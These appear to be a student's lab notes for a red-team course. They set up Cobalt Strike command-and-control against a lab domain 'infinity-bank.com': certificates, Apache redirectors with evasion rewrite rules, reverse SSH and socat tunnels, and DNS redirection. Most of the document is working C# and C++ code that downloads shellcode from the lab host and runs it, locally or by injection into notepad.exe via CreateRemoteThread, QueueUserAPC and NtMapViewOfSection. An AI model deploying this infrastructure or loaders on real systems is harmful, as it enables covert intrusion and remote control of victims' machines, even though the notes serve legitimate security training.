
***NOTE** Copy and paste from desktop to snaplabs ctrl-shift-alt*
## Apache setup on redirector

On redirector-1:

```
sudo apt install apache2
sudo a2enmod ssl rewrite proxy proxy_http
cd /etc/apache2/sites-enabled
sudo rm 000-default.conf
cd
sudo ln -s ../sites-available/default-ssl.conf
ll
sudo systemctl restart apache2
```

### On PowerDNS

Now go to PowerDNS box in snaplabs applications, sign in with admin:admin

Hosted Domains are listed, in our case it's infinity-bank.com, has an A record that points to the redirector for us. Probably need to setup on our own for exam, keep an eye on.
### On attacker desktop

Can confirm correctly configured from attacker desktop with: 
```
dig infinity-bank.com +short
dig www.infinity-bank.com +short
```

Generate SSL Certs for it:

```
//open powershell
wsl
cd
openssl genrsa -out infinity-bank.key 2048
openssl req -new -key infinity-bank.key -out infinity-bank.csr
```

The public/private keypair for this fake CA is located in `/home/attacker/ca`.

Before processing the CSR, create a new file, `infinity-bank.ext` with the following content in the `/home/attacker/ca` folder
```
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = infinity-bank.com
DNS.2 = www.infinity-bank.com
```

Now generate a signed certificate:
```
openssl x509 -req -in infinity-bank.csr -CA ca/ca.crt -CAkey ca/ca.key -CAcreateserial -out infinity-bank.crt -days 365 -sha256 -extfile ca/infinity-bank.ext
```

Now move over to the redirector:

```
scp infinity-bank.key attacker@10.10.0.100:/home/attacker/private.key
scp infinity-bank.crt attacker@10.10.0.100:/home/attacker/public.crt
```

Confirm files have been placed correctly in `/home/attacker/`

```
ssh attacker@10.10.0.100
ls -l
```

Now in that same ssh session copy the private key and public cert into their respective places:
```
sudo cp private.key /etc/ssl/private/
sudo cp public.crt /etc/ssl/certs/
```

Open `/etc/apache2/sites-enabled/default-ssl.conf` in a text editor (nano or vim) and look for lines 32-33. Change paths to the ones we created for the key and cert file

```
sudo vim `/etc/apache2/sites-enabled/default-ssl.conf`
//make changes
sudo systemctl restart apache2
```

Confirm by visiting https://www.infinity-bank.com on the attacker desktop and view the certificate

## Beacon certificates

### On attacker desktop

```
//open powershell
wsl
cd
openssl req -x509 -nodes -newkey rsa:2048 -keyout localhost.key -out localhost.crt -sha256 -days 365 -subj '/CN=localhost'
openssl pkcs12 -inkey localhost.key -in localhost.crt -export -out localhost.pfx
	pass123
keytool -importkeystore -srckeystore localhost.pfx -srcstoretype pkcs12 -destkeystore localhost.store
```

This will produce a new file, `localhost.store`, which needs to be copied this to the team server.

```
rm localhost.pfx
scp localhost.store attacker@10.10.5.50:/home/attacker/cobaltstrike/
```

### SSH to attacker server
Make new keystore file in the webbug.profile:
```
ssh attacker@10.10.5.50
vim /home/attacker/cobaltstrike/c2-profiles/normal/webbug.profile
```

Add this to the top of the file:
```
https-certificate {
     set keystore "localhost.store";
     set password "pass123";
}
```

Launch teamserver with the updated profile:

```
cd cobaltstrike/
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```

Start up Cobalt Strike on the attacker desktop. Connect with the above password. Now create a new HTTPS listener with the HTTPS hosts set as www.infinity-bank.com
![[Pasted image 20250318101223.png]]

## SSH Tunnel

Create a reverse SSH tunnel from the team server to Redirector 1

### From attacker Desktop

```
//open powershell
wsl
cd
ssh attacker@10.10.5.50
tmux new
ssh -N -R 8443:localhost:443 attacker@10.10.0.100
```

You can now `curl localhost:8443` on redirector-1 and it will hit the Cobalt Strike listener.  However, it will throw an error that the SSL certificate is untrusted. Now fix this:
```
//open powershell
wsl
cd
scp localhost.crt attacker@10.10.0.100:/home/attacker/
//ssh to redirector-1
ssh attacker@10.10.0.100
sudo cp localhost.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

### With autossh from the teamserver

On the team server create a new file at `.ssh/config` and add the following content:

```
Host                 redirector-1
HostName             10.10.0.100
User                 attacker
Port                 22
IdentityFile         /home/attacker/.ssh/id_rsa
RemoteForward        8443 localhost:443
ServerAliveInterval  30
ServerAliveCountMax  3
```

Then run the tunnel:
```
autossh -M 0 -f -N redirector-1
```


**NOTE** When checking on redirector-1 for ssh being configured right look for localhost binded to 8443 in this commands output: `sudo ss -lntp`
## Enabling Apache Redirection

### On redirector-1

1. Change the .htaccess config file information in the `/etc/apache2/sites-enabled/default-ssl.conf` file. Under `</VirtualHost>` add a `<Directory>` value with this content:

```
<Directory /var/www/html/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>
```

2. Before closing file, add `SSLProxyEngine on` underneath `SSLEngine on` and then restart apache.

3. Next, create a new `.htaccess` file in the apache web root, `/var/www/html` and enter the following:
```
RewriteEngine on
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

Can confirm from Cobalt Strikes web log that the a request against https://www.infinity-bank.com/test goes through with the redirect.

## User Agent, Cookie, URI and Query Rules

### On redirector-1
1. run `echo "Nothing to see here..." | sudo tee /var/www/html/diversion`
2. Edit the .htaccess file with this:
```
RewriteEngine on

RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]

RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

### Cookie Rules continued

### On team server
Change the webbug profiles http gets metadata section on the team server with:

```
metadata {
    netbios;
    prepend "SESSIONID=";
    header "Cookie";
}
```

make sure to restart the team server to apply

### URI and Query Rules

### 


Allowing traffic to files if the exact name is used for the .htaccess:

```
RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a|b|c|d$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} a|b|c|d
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```

Full .htaccess file that is currently working:

```
RewriteEngine on

RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]

RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteCond %{REQUEST_URI} __utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ___utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-220(.*)-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a|b|c|d$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} a|b|c|d
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```

## Turning off Beacon staging

### On team server just add this to the webbug.profile

```
set host_stage "false";
```

make sure to restart teamserver

## Redirecting DNS

We can also redirect DNS traffic through a redirector, for which we'll use **Redirector 2**.

### Sign into PowerDNS on snaplabs

it already exists but it's the bacs cert with ns1.infinity-bank.com. as a NS record

### On teamserver

Have to open a tcp tunnel from teamserver to the redirector-2

```
ssh attacker@10.10.0.200 -R 5353:localhost:5353
//then on redirector 2 with this ssh run:
sudo socat udp4-listen:53,reuseaddr,fork tcp:localhost:5353
//now go back to teamserver, im doing this in tmux sessions to separate
sudo socat tcp-listen:5353,reuseaddr,fork udp4-sendto:localhost:53
```

Now create a DNS listener with DNS like so:

![[Pasted image 20250403222442.png]]

## Visual studio setup

Go to _Project > Add Reference > Browse_ and add a reference to `DInvoke.Data.dll` and `DInvoke.DynamicInvoke.dll` in `C:\Tools\DInvoke\DInvoke.DynamicInvoke\bin\Release\netstandard2.0`.

Change the DllImport attribute to `UnmanagedFunctionPointer` and the extern keyword to `delegate`

CSharp code for createprocess with D/Invoke:

program.cs
```
using DInvoke.DynamicInvoke;
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // create startup info
            var startupInfo = new Win32.STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);

            // create process
            object[] parameters = {null, "notepad.exe", IntPtr.Zero, IntPtr.Zero, false, (uint)0,
            IntPtr.Zero, null, startupInfo, new Win32.PROCESS_INFORMATION()};

            var success = (bool)Generic.DynamicApiInvoke(
            "kernel32.dll",
            "CreateProcessW",
            typeof(Win32.CreateProcessWDelegate),
            ref parameters);

            var processInfo = (Win32.PROCESS_INFORMATION)parameters[9];

            // bail if it failed
            if (!success)
            {
                Console.WriteLine("[x] CreateProcessW failed");
                return;
            }

            // print process info
            Console.WriteLine("dwProcessId : {0}", processInfo.dwProcessId);
            Console.WriteLine("dwThreadId  : {0}", processInfo.dwThreadId);
            Console.WriteLine("hProcess    : 0x{0:X}", processInfo.hProcess);
            Console.WriteLine("hThread     : 0x{0:X}", processInfo.hThread);

            // close handles
            Win32.CloseHandle(processInfo.hThread);
            Win32.CloseHandle(processInfo.hProcess);
        }
    }
}
```

Win32.cs class:
```
using System.Runtime.InteropServices;

internal static class Win32
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]

    public delegate bool CreateProcessWDelegate(
        string applicationName,
        string commandLine, 
        IntPtr processAttributes,
        IntPtr threadAttribuates,
        bool inheritHandles,
        CREATION_FLAGS creationFlags,
        IntPtr environment,
        string currentDirectory,
        ref STARTUPINFO startupInfo,
        out PROCESS_INFORMATION processInfo);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
```

Changes to program.cs to make use of ordinals:

```
using DInvoke.DynamicInvoke;
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // create startup info
            var startupInfo = new Win32.STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);

            // create process
            object[] parameters = {null, "notepad.exe", IntPtr.Zero, IntPtr.Zero, false, (uint)0,
            IntPtr.Zero, null, startupInfo, new Win32.PROCESS_INFORMATION()};

            var hLibrary = Generic.GetLibraryAddress("kernel32.dll", 233);

            var success = (bool)Generic.DynamicFunctionInvoke(
    hLibrary,
    typeof(Win32.CreateProcessWDelegate),
    ref parameters);

            var processInfo = (Win32.PROCESS_INFORMATION)parameters[9];

            // bail if it failed
            if (!success)
            {
                Console.WriteLine("[x] CreateProcessW failed");
                return;
            }

            // print process info
            Console.WriteLine("dwProcessId : {0}", processInfo.dwProcessId);
            Console.WriteLine("dwThreadId  : {0}", processInfo.dwThreadId);
            Console.WriteLine("hProcess    : 0x{0:X}", processInfo.hProcess);
            Console.WriteLine("hThread     : 0x{0:X}", processInfo.hThread);

            // close handles
            Win32.CloseHandle(processInfo.hThread);
            Win32.CloseHandle(processInfo.hProcess);
        }
    }
}
```

## Process Injection

do _Payloads > Windows Stageless Generate All Payloads_ then we will host both the raw payloads for the http listener that use ExitProcess and ExitThread.

Download files CSharp:

```
using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace InfinityBankShellcodeDownloader
{
    class Program
    {
        static async Task Main(string[] args)
        {
            byte[] shellcode;

            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("https://www.infinity-bank.com");
                shellcode = await client.GetByteArrayAsync("/shellcode.bin");
            }

            Console.WriteLine("Shellcode downloaded successfully.");
            Console.WriteLine("Press any key to exit.");
            Console.ReadKey();
        }
    }
}
```

C++ downloading and executing with function delegate

```
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

    //get point to buffer
    LPVOID ptr = &shellcode[0];

    //set memory to RWX
    DWORD oldProtect = 0;
    VirtualProtect(ptr, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect);

    (*(void(*)()) ptr)();
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
```

Download files C++ with CreateThread:
```
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

    //get point to buffer
    LPVOID ptr = &shellcode[0];

    //set memory to RWX
    DWORD oldProtect = 0;
    VirtualProtect(ptr, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect);

    //execute 
    DWORD threadId = 0;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, &threadId);

    //close handle
    CloseHandle(hThread);

    //stop the program from closing
    std::cout << "Shellcode is running, press key to exit" << std::endl;
    _getch();
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
```

C++ CreateRemoteThread with notepad.exe:

```
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        startup_info,
        process_info);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

    // allocate memory
    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        process_info->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten);

    // create remote thread
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(
        process_info->hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)ptr,
        NULL,
        0,
        &threadId);

    // close handles
    CloseHandle(hThread);
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
```

C++ QueueUserAPC

```
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

    // allocate memory
    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        process_info->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten);

    //Queue APC
    QueueUserAPC((PAPCFUNC)ptr, process_info->hThread, 0);

    //resume process
    ResumeThread(process_info->hThread);

    // close handles
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
```


C++ header file for NtMapViewOfSection named Native.h

```
#pragma once
#include <Windows.h>
#include <winternl.h>

using NtCreateSection = NTSTATUS(NTAPI*)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
	IN OPTIONAL PLARGE_INTEGER MaximumSize,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN OPTIONAL HANDLE FileHandle);

using NtMapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN SIZE_T CommitSize,
	IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
	IN OUT PSIZE_T ViewSize,
	IN DWORD InheritDisposition,
	IN ULONG AllocationType,
	IN ULONG Win32Protect);

using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress OPTIONAL);

typedef enum _SECTION_INHERIT : DWORD {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;
```

C++ Code for NTMapViewOfSection:

```
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>
#include "Native.h"

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

    // find Nt APIs
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
